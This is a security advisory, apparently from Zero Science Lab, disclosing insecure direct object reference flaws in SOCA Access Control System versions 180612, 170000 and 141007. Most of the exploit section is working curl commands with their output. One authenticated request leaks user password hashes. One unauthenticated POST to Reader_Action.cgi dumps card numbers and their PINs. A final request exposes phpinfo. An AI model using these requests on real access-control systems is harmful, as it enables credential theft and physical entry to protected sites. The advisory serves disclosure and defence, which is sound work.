@@ -1,0 +1,92 @@
+SOCA Access Control System 180612 Information Disclosure
+
+
+Vendor: SOCA Technology Co., Ltd
+Product web page: http://www.socatech.com
+Affected version: 180612, 170000 and 141007
+
+Summary: The company's products include proximity and fingerprint access
+control system, time and attendance, electric locks, card reader and writer,
+keyless entry system and other 30 specialized products. All products are
+attractively designed with advanced technology in accordance with users'
+safety and convenience which also fitted international standard.
+
+Desc: Insecure direct object references occur when an application provides
+direct access to objects based on user-supplied input. As a result of this
+vulnerability attackers can bypass authorization and access resources and
+functionalities in the system.
+
+Tested on: Windows NT 6.1 build 7601 (Windows 7 Service Pack 1) i586
+           Windows NT 6.2 build 9200 (Windows Server 2012 Standard Edition) i586
+           Apache/2.2.22 (Win32)
+           PHP/5.4.13
+           Firebird/InterBase DBMS
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5517
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5517.php
+
+
+20.04.2018
+
+--
+
+
+Authenticated users password hash disclosure via Get_Permissions_From_DB.php:
+-----------------------------------------------------------------------------
+
+# curl -s http://10.0.0.3/Permission/Get_Permission_From_DB.php -H "Cookie: PHPSESSID=u412baebe2uogds21apgcsvhr6"
+
+[{"Idx":1,"Id":"USER","Password":"4a7d1ed414474e4033ac29ccb8653d9b","Access":"ffffff00ff00ffffff00"},{"Idx":2,"Id":"soca","Password":"3c0d71fab22bc8703324e06d59a81700","Access":"ffffff00ff00ffffff00"}]
+
+
+Unauthenticated users passwords (pins) disclosure via Ac10_ReadSortCard:
+------------------------------------------------------------------------
+
+# curl -X POST http://10.0.0.3/cgi-bin/Reader_Action.cgi/Ac10_ReadSortCard --data "Reader=%7B%22Idx%22%3A5%2C%22Model%22%3A502%2C%22Comm%22%3A%22TCP%2C10.0.0.3%2C4444%22%2C%22Timeout%22%3A1%2C%22SubNames%22%3A%7B%221%22%3A%22%22%2C%222%22%3A%22%22%2C%223%22%3A%22%22%2C%224%22%3A%22%22%2C%225%22%3A%22%22%2C%226%22%3A%22%22%2C%227%22%3A%22%22%2C%228%22%3A%22%22%7D%2C%22CreateTime%22%3A%222016-04-28+15%3A57%3A31%22%2C%22EditTime%22%3A%222018-12-26+17%3A14%3A37%22%2C%22Polling%22%3A1%2C%22Done%22%3Afalse%7D&Section=17" -s |grep Password |lolcat
+
+{"cmd":"readcard","success":true,"Reader":{"Idx":5,"Model":502,"SubNames":
+{"8":"","7":"","6":"","5":"","4":"","3":"","2":"","1":""},"No":1,"Polling":
+1,"EditTime":"2018-12-26 17:14:37","Name":"READER017","Done":false,"Comm":"TCP,10.0.0.3,4444",
+"Timeout":1,"CreateTime":"2016-04-28 15:57:31"},"Section":17,"Cards":[
+{"Card":"3758236739","Password":"0000","Timezone":"1"},{"Card":"3758294894","Password":"0000","Timezone":"1"},
+{"Card":"3758393748","Password":"0000","Timezone":"1"},{"Card":"3758397434","Password":"0000","Timezone":"1"},
+{"Card":"3758526944","Password":"0000","Timezone":"1"},{"Card":"3758556239","Password":"0000","Timezone":"1"},
+{"Card":"3759183323","Password":"0000","Timezone":"1"},{"Card":"3759289453","Password":"0000","Timezone":"1"},
+{"Card":"3759444892","Password":"0000","Timezone":"1"},{"Card":"3759608121","Password":"0000","Timezone":"1"},
+{"Card":"3759700024","Password":"0000","Timezone":"1"},{"Card":"3760195859","Password":"0000","Timezone":"1"},
+{"Card":"3760330834","Password":"0000","Timezone":"1"},{"Card":"3760455789","Password":"0000","Timezone":"1"},
+{"Card":"3760493498","Password":"0000","Timezone":"1"},{"Card":"3760555917","Password":"0000","Timezone":"1"},
+{"Card":"3760674062","Password":"0000","Timezone":"1"},{"Card":"3761256706","Password":"0000","Timezone":"1"},
+{"Card":"3761275358","Password":"0000","Timezone":"1"},{"Card":"3761386285","Password":"0000","Timezone":"1"},
+{"Card":"3761398620","Password":"0000","Timezone":"1"},{"Card":"3761452653","Password":"0000","Timezone":"1"},
+{"Card":"3761514319","Password":"0000","Timezone":"1"},{"Card":"3761543092","Password":"0000","Timezone":"1"},
+{"Card":"3761766657","Password":"0000","Timezone":"1"},{"Card":"3761783860","Password":"0000","Timezone":"1"},
+{"Card":"3762311449","Password":"0000","Timezone":"1"},{"Card":"3762313335","Password":"0000","Timezone":"1"},
+{"Card":"3762328203","Password":"0000","Timezone":"1"},{"Card":"3762384973","Password":"0000","Timezone":"1"},
+{"Card":"3762647673","Password":"0000","Timezone":"1"},{"Card":"3762688310","Password":"0000","Timezone":"1"},
+{"Card":"3762771467","Password":"0000","Timezone":"1"},{"Card":"3762827566","Password":"0000","Timezone":"1"},
+{"Card":"3762843960","Password":"0000","Timezone":"1"},{"Card":"3762910530","Password":"0000","Timezone":"1"},
+{"Card":"3763344650","Password":"0000","Timezone":"1"},{"Card":"3763417869","Password":"0000","Timezone":"1"},
+{"Card":"3763492897","Password":"0000","Timezone":"1"},{"Card":"3763734440","Password":"0000","Timezone":"1"},
+{"Card":"3763865189","Password":"0000","Timezone":"1"},{"Card":"3763889211","Password":"0000","Timezone":"1"},
+{"Card":"3764619719","Password":"0000","Timezone":"1"},{"Card":"3764811544","Password":"0000","Timezone":"1"},
+{"Card":"3764846862","Password":"0000","Timezone":"1"},{"Card":"3765568542","Password":"0000","Timezone":"1"},
+{"Card":"3765790491","Password":"0000","Timezone":"1"},{"Card":"3765917518","Password":"0000","Timezone":"1"},
+{"Card":"3765962614","Password":"0000","Timezone":"1"},{"Card":"3765978672","Password":"0000","Timezone":"1"},
+{"Card":"3766032648","Password":"0000","Timezone":"1"},{"Card":"3766498811","Password":"0000","Timezone":"1"},
+{"Card":"3766625241","Password":"0000","Timezone":"1"},{"Card":"3766970803","Password":"0000","Timezone":"1"},
+{"Card":"3767105946","Password":"0000","Timezone":"1"},{"Card":"3767601584","Password":"0000","Timezone":"1"},
+...
+...
+...
+
+
+phpinfo() disclosure:
+---------------------
+
+# curl -s http://10.0.0.3/phpinfo.php
